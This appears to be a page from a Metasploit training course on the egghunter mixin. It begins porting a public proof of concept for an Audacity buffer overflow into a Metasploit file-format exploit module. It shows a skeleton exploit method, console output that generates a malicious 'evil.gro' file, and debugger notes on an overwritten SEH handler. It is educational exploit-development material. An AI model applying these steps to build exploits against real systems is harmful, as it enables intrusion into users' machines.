<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Using The Egghunter Mixin</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Using
The Egghunter Mixin</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">The MSF egghunter mixin is a wonderful
module which can be of great
use in exploit development. If you're not familiar with the concepts of
egghunters, read this.
</p>
<p style="color: rgb(0, 0, 0);">A recent vulnerability in the Audacity
Audio Editor presented
us with an opportunity to examine this mixin in greater depth. In the
next module, we will exploit Audacity and create a Metasploit file
format exploit module for it. We will not focus on the exploitation
method itself or the theory behind it - but dive right into the
practical usage of the Egghunter mixin.
Setting up Audacity
</p>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>Download and install the vulnerable software on your XP SP2
box:
      </li>
    </ul>
  </dd>
</dl>
<p style="color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/archive/audacity-win-1.2.6.exe"
 class="external free" rel="nofollow">http://www.offensive-security.com/archive/audacity-win-1.2.6.exe</a>
<a
 href="http://www.offensive-security.com/archive/LADSPA_plugins-win-0.4.15.exe"
 class="external free" rel="nofollow">http://www.offensive-security.com/archive/LADSPA_plugins-win-0.4.15.exe</a>
</p>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>Download and examine the original POC, taken from&nbsp;: <a
 href="http://milw0rm.com/exploits/7634" class="external free"
 rel="nofollow">http://milw0rm.com/exploits/7634</a>
      </li>
    </ul>
  </dd>
</dl>
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Porting_the_PoC">Porting the PoC</span></h4>
<p style="color: rgb(0, 0, 0);">Let's port this POC to an MSF file
format exploit module. We can use
an existing module to get a general template. The
zinfaudioplayer221_pls.rb exploit provides us with a good start.
</p>
<p style="color: rgb(0, 0, 0);">Our skeleton exploit should look
similar to this. Notice our buffer being generated here:
<br>
</p>
<pre style="color: rgb(0, 0, 0);"> def exploit<br>    buff = Rex::Text.pattern_create(2000)<br>    print_status("Creating '#{datastore['FILENAME']}' file ...")<br>    file_create(buff)<br> end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We use
Rex::Text.pattern_create(2000) to create a unique string of
2000 bytes in order to be able to track buffer locations in the
debugger.
</span>
<p style="color: rgb(0, 0, 0);">Once we have the POC ported, we
generate the exploit file and
transfer it to our Windows box. Use the generic/debug_trap payloads to
begin with.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">msf exploit(audacity) &gt; show options<br><br>Module options:<br><br>Name       Current Setting Required Description<br>----       --------------- -------- -----------<br>FILENAME   evil.gro        yes      The file name.<br>OUTPUTPATH /var/www        yes      The location of the file.<br><br><br>Payload options (generic/debug_trap):<br><br>Name Current Setting Required Description<br>---- --------------- -------- -----------<br><br><br>Exploit target:<br><br>Id Name<br>-- ----<br>0 Audacity Universal 1.2<br><br><br>msf exploit(audacity) &gt; exploit<br><br>[*] Creating 'evil.gro' file ...<br>[*] Generated output file /var/www/evil.gro<br>[*] Exploit completed, but no session was created.<br>msf exploit(audacity) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We open Audacity, attach a debugger
to it and import the MIDI gro file.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Pre-attach-00.png"
 class="image"><img alt="Pre-attach-00.png"
 src="http://www.offensive-security.com/w/images/e/e6/Pre-attach-00.png"
 width="527" height="383"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
We immediately get an exception from Audacity, and the debugger pauses:
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Attach-00.png"
 class="image"><img alt="Attach-00.png"
 src="http://www.offensive-security.com/w/images/8/81/Attach-00.png"
 width="601" height="480"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
A quick look at the SEH chain shows that we have overwritten an
exception handler.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Aud-seh-00.png"
 class="image"><img alt="Aud-seh-00.png"
 src="http://www.offensive-security.com/w/images/c/c9/Aud-seh-00.png"
 width="269" height="174"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
We take the exception (shift + F9), and see the following:
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Aud-seh-01.png"
 class="image"><img alt="Aud-seh-01.png"
 src="http://www.offensive-security.com/w/images/6/68/Aud-seh-01.png"
 width="601" height="479"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Exploit_Development"
 title="Exploit Development">Exploit Development</a></div>
<p style="color: rgb(0, 0, 0);"><br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Completing_The_Exploit"
 title="Completing The Exploit">Completing the Exploit</a></div>
</body>
</html>
